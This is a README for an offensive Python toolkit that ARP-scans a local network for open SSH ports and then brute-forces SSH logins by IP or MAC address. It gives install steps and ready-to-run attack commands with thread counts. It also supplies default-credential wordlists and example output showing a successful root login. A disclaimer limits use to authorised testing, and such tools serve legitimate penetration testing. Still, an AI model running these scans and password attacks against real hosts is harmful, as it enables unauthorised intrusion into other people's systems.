# SSH Brute-Force Suite (by IP or MAC Address)

This collection of Python scripts is designed for penetration testing on a local network. It consists of two main tools:

1.  `ssh_mac_scanner.py`: Scans the local network to discover active devices and checks if their SSH port is open.
2.  `ssh_brute_mac-ip.py`: Performs a brute-force attack on an SSH service, with the flexibility to target by either IP address or MAC address.

---

### Key Features

* **Network Scanning**: Discover all active devices within a specific IP range using an ARP scan.
* **SSH Port Check**: Quickly verify if port 22 (or a custom SSH port) is open on discovered devices.
* **Flexible Targeting**: Launch a brute-force attack using the target's IP address or its MAC address (the script will automatically find the corresponding IP from the ARP table).
* **Wordlist Support**: Use wordlists for both usernames and passwords.
* **Multi-threading**: Perform attacks quickly by using multiple threads simultaneously.
* **Logging**: All Paramiko connection activities are logged to `paramiko.log` for debugging purposes.

---

### Requirements

These scripts require Python 3 and a few additional libraries.

* `paramiko`
* `scapy`

---

### Installation

1.  **Clone this repository:**
    ```bash
    git clone [https://github.com/Fauzan-Putra/Simple-SSH-Bruteforce-Tools.git](https://github.com/Fauzan-Putra/Simple-SSH-Bruteforce-Tools.git)
    cd Simple-SSH-Bruteforce-Tools
    ```

2.  **Install the required libraries using pip:**
    ```bash
    pip install -r requirements.txt
    ```
    *(Ensure you have a `requirements.txt` file containing `paramiko` and `scapy`)*

---

### How to Use (Workflow)

The recommended workflow is to first use `ssh_mac_scanner.py` to identify potential targets, and then use `ssh_brute_mac-ip.py` to attempt to gain access.

#### Step 1: Scan the Network with `ssh_mac_scanner.py`

Run this script to find hosts with an open SSH port on your network. Replace `192.168.1.0/24` with your network's CIDR range.

```bash
python ssh_mac_scanner.py --range 192.168.1.0/24
```

**Example Output:**

```
[INFO] Performing ARP scan on 192.168.1.0/24...
[INFO] Found 5 active devices.

192.168.1.1     a1:b2:c3:d4:e5:f6   SSH: CLOSED
192.168.1.5     b2:c3:d4:e5:f6:a1   SSH: OPEN
192.168.1.9     c3:d4:e5:f6:a1:b2   SSH: CLOSED
192.168.1.12    d4:e5:f6:a1:b2:c3   SSH: OPEN
...
```

From the output above, we have identified two potential targets: `192.168.1.5` and `192.168.1.12`.

#### Step 2: Perform the Attack with `ssh_brute_mac-ip.py`

Once you have a target, use the brute-force script. You will need wordlists for usernames and passwords.

**Prepare your wordlist files:**

* `users.txt`:
    ```
    root
    admin
    user
    test
    ```

* `passwords.txt`:
    ```
    123456
    password
    admin
    root
    ```

**Example Commands:**

1.  **Attacking using an IP Address:**
    ```bash
    python ssh_brute_mac-ip.py --host 192.168.1.5 --userlist users.txt --wordlist passwords.txt --threads 10
    ```

2.  **Attacking using a MAC Address:**
    ```bash
    python ssh_brute_mac-ip.py --mac b2:c3:d4:e5:f6:a1 --userlist users.txt --wordlist passwords.txt --threads 10
    ```

3.  **Attacking with a single username:**
    ```bash
    python ssh_brute_mac-ip.py --host 192.168.1.5 --user root --wordlist passwords.txt
    ```

**Example Attack Output:**

```
[INFO] Found IP 192.168.1.5 for MAC b2:c3:d4:e5:f6:a1
[INFO] Starting brute-force on 192.168.1.5 with 4 users and 4 passwords (max 10 threads)
[-] Failed: root:123456
[-] Failed: root:password
[+] LOGIN SUCCESSFUL --> root:root
[-] Failed: admin:123456
...
```

---

### Disclaimer

⚠️ **WARNING**: This tool is created for educational purposes and ethical security testing only. Using this tool against systems without the explicit permission of the owner is illegal. The author is not responsible for any misuse or damage caused by this program. Use it wisely and responsibly.
